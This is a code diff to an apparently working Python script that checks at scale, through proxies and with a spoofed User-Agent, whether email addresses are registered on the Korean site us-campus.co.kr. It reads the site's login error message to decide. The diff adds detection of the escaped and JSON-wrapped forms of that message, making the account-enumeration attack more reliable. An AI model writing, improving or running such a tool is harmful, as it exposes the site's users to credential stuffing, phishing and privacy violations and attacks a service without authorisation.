@@ -12,6 +12,17 @@ import time
 BASE = "https://us-campus.co.kr"
 H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
 HIT_LOGIN = "비밀번호가 일치"
+HIT_ESCAPED = r"\ube44\ubc00\ubc88\ud638\uac00 \uc77c\uce58"  # 비밀번호가 일치
+
+
+def is_registered(text: str) -> bool:
+    if HIT_LOGIN in text or HIT_ESCAPED in text:
+        return True
+    try:
+        data = json.loads(text)
+        return HIT_LOGIN in data.get("message", "")
+    except Exception:
+        return False
 
 
 def _proxy_url(proxy: str) -> str | None:
@@ -32,7 +43,7 @@ async def check(email: str, session: aiohttp.ClientSession, sem: asyncio.Semapho
                 timeout=aiohttp.ClientTimeout(total=8, connect=3),
             ) as resp:
                 text = await resp.text()
-                if HIT_LOGIN in text:
+                if is_registered(text):
                     return {"email": email, "status": "registered", "via": "login"}
         except Exception:
             pass
